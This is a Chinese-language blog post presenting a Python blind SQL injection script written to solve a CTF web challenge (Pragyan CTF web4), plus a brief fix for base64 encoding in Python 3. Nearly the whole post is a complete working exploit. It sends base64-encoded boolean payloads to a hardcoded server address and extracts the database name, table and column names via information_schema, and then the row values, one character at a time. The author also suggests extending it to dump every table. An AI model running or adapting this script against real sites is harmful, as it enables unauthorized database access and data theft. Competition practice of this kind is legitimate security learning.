---
layout: post
title: "python sql盲注脚本"
date: 2018-03-05 22：40
categories: jekyll update
---

## 前言
&emsp;&emsp;sql注入中要数盲注比较慢，尤其是没有脚本辅助的情况下，所以写个`sql盲注`的`脚本`在ctf中有比较重要的作用。此文的程序语言为`python`。下面的脚本是对pragyan ctf web4的解决方案，所以payload中使用了base64编码，这里遇到一个小坑，比赛的时候使用`base64.b64encode()`发生了`编码错误`，又因为时间紧张，所以就放缓了脚本的编写，但现在已经解决了加密的编码问题。

&emsp;&emsp;python3 base64编码问题的解决方法为：
```python
base64.b64encode(test3.encode('utf-8')) # 先将string型的test3转换成bytes加密
testi = str(testi, encoding='utf-8') # 再将bytes型的testi转换成string
```

&emsp;&emsp;详细代码如下：
```python
# -*- coding:utf-8 -*-
from time import sleep

import requests
import base64

# 适用于poc: 1' or 1=1 -- +

url = 'http://128.199.224.175:24000/'

poc1 = "1' or 1=1 -- +"
sqli = base64.b64encode(poc1.encode('utf-8'))
sqli = str(sqli, encoding='utf-8')
params = {'spy_name': sqli}
html = requests.post(url, params)
r = html.text
right_len = len(r)

poc2 = "1' or 1=2 -- +"
sqli = base64.b64encode(poc2.encode('utf-8'))
sqli = str(sqli, encoding='utf-8')
params = {'spy_name': sqli}
html = requests.post(url, params)
r = html.text
wrong_len = len(r)
judge = wrong_len + (right_len - wrong_len) // 2

def fuzz(sql, test, pos1, pos2, tmp):
    left = 32
    right = 127
    while True:
        mid = (left + right) // 2
        # print('正在测试字符：', str(mid))
        test3 = test.format(pos1 - 1, pos2, mid)
        testi = base64.b64encode(test3.encode('utf-8'))
        testi = str(testi, encoding='utf-8')
        params = {'spy_name': testi}
        html = requests.post(url, params)
        r = html.text
        if len(r) > judge:
            tmp += chr(mid)
            return tmp

        sqli = sql.format(pos1 - 1, pos2, mid)
        sqli = base64.b64encode(sqli.encode('utf-8'))
        sqli = str(sqli, encoding='utf-8')
        params = {'spy_name': sqli}
        html = requests.post(url, params)
        r = html.text
        if len(r) > judge:
            left = mid
        else:
            right = mid

database = ''
sql = "1' or (ascii(substr(database(),{0},1)))>{1} -- +"
test = "1' or (ascii(substr(database(),{0},1)))={1} -- +"
for pos in range(1, 50):
    # 测试length(database())，一旦超过长度则不用再执行。

    test2 = sql.format(pos,1)
    sqli = base64.b64encode(test2.encode('utf-8'))
    sqli = str(sqli, encoding='utf-8')
    params = {'spy_name': sqli}
    html = requests.post(url, params)
    r = html.text
    if len(r) < judge:
        print('======================')
        print('[*]database: ',database)
        print('======================\n')
        break

    left = 32
    right = 127
    while True:
        mid = (left + right) // 2
        # print('正在测试字符：', str(mid))
        test3 = test.format(pos, mid)
        testi = base64.b64encode(test3.encode('utf-8'))
        testi = str(testi, encoding='utf-8')
        params = {'spy_name': testi}
        html = requests.post(url, params)
        r = html.text
        if len(r) > judge:
            database += chr(mid)
            print('[+]database: ', database)
            break

        sqli = sql.format(pos, mid)
        sqli = base64.b64encode(sqli.encode('utf-8'))
        sqli = str(sqli, encoding='utf-8')
        params = {'spy_name': sqli}
        html = requests.post(url, params)
        r = html.text
        if len(r) > judge:
            left = mid
        else:
            right = mid



tables_name = {}
sql = "1' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {0},1),{1},1)))>{2} -- +"
test = "1' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {0},1),{1},1)))={2} -- +"
for table_num in range(1, 20):
    sqli = sql.format(table_num - 1, 1, 1)
    sqli = base64.b64encode(sqli.encode('utf-8'))
    sqli = str(sqli, encoding='utf-8')
    params = {'spy_name': sqli}
    html = requests.post(url, params)
    r = html.text
    if len(r) < judge:
        print('[*]已无其他表！')
        break
    print('[+]正在爆破表', str(table_num))
    table = ''
    for str_num in range(1, 50):
        # 测试length(database())，一旦超过长度则不用再执行。
        test2 = sql.format(table_num - 1, str_num, 1)
        sqli = base64.b64encode(test2.encode('utf-8'))
        sqli = str(sqli, encoding='utf-8')
        params = {'spy_name': sqli}
        html = requests.post(url, params)
        r = html.text
        if len(r) < judge:
            print('======================')
            print('[*]table: ', table)
            tables_name[table_num] = table
            print('======================\n')
            break

        table = fuzz(sql, test, table_num, str_num, table)
        print('[+]table: ', table)

print('******************')
for key in tables_name:
    print('[*]table' + str(key) + ': ' + tables_name[key])
print('******************\n')


tb = int(input('>请选择需要爆破的表(数字)：'))
# for tb in tables_name:
sql = "1' or (ascii(substr((select column_name from information_schema.columns where table_name='" + tables_name[tb]+ "' limit {0},1),{1},1)))>{2} -- +"
test = "1' or (ascii(substr((select column_name from information_schema.columns where table_name='" + tables_name[tb]+ "' limit {0},1),{1},1)))={2} -- +"
colunms_name = {}
for column_num in range(1, 20):
    sqli = sql.format(column_num - 1, 1, 1)
    sqli = base64.b64encode(sqli.encode('utf-8'))
    sqli = str(sqli, encoding='utf-8')
    params = {'spy_name': sqli}
    html = requests.post(url, params)
    r = html.text
    if len(r) < judge:
        print('[*]已无其他字段！')
        break
    print('[+]正在爆破字段', str(column_num))
    column = ''
    for str_num in range(1, 50):
        # 测试length(database())，一旦超过长度则不用再执行。
        test2 = sql.format(column_num - 1, str_num, 1)
        sqli = base64.b64encode(test2.encode('utf-8'))
        sqli = str(sqli, encoding='utf-8')
        params = {'spy_name': sqli}
        html = requests.post(url, params)
        r = html.text
        if len(r) < judge:
            print('======================')
            print('[*]column: ', column)
            colunms_name[column_num] = column
            print('======================\n')
            break

        column = fuzz(sql, test, column_num, str_num, column)
        print('[+]column: ', column)

print('******************')
for key in colunms_name:
    print('[*]column' + str(key) + ': ' + colunms_name[key])
print('******************\n')


cl = int(input('>请选择需要爆破的字段(数字)：'))
sql = "1' or (ascii(substr(( select " + colunms_name[cl] + " from " + tables_name[tb]+ " limit {0},1),{1},1)))>{2} -- +"
test = "1' or (ascii(substr(( select " + colunms_name[cl] + " from " + tables_name[tb]+ " limit {0},1),{1},1)))={2} -- +"
key = []
for num in range(1, 20):
    sqli = sql.format(num - 1, 1, 1)
    sqli = base64.b64encode(sqli.encode('utf-8'))
    sqli = str(sqli, encoding='utf-8')
    params = {'spy_name': sqli}
    html = requests.post(url, params)
    r = html.text
    if len(r) < judge:
        print('[*]已无其他值！')
        break
    print('[+]正在爆破第', str(num))
    tmp_key = ''
    for str_num in range(1, 50):
        # 测试length(database())，一旦超过长度则不用再执行。
        test2 = sql.format(num - 1, str_num, 1)
        sqli = base64.b64encode(test2.encode('utf-8'))
        sqli = str(sqli, encoding='utf-8')
        params = {'spy_name': sqli}
        html = requests.post(url, params)
        r = html.text
        if len(r) < judge:
            print('======================')
            print('[*]key: ', tmp_key)
            key.append(tmp_key)
            print('======================\n')
            break

        tmp_key = fuzz(sql, test, num, str_num, tmp_key)
        print('[+]key: ', tmp_key)

print('******************')
for tt in key:
    print('[*]key: ' + tt)
print('******************\n')

```
&emsp;&emsp;上面的代码还可以优化，比如增加sqlmap中的--dump功能，将所有的表跟字段都爆破出来。
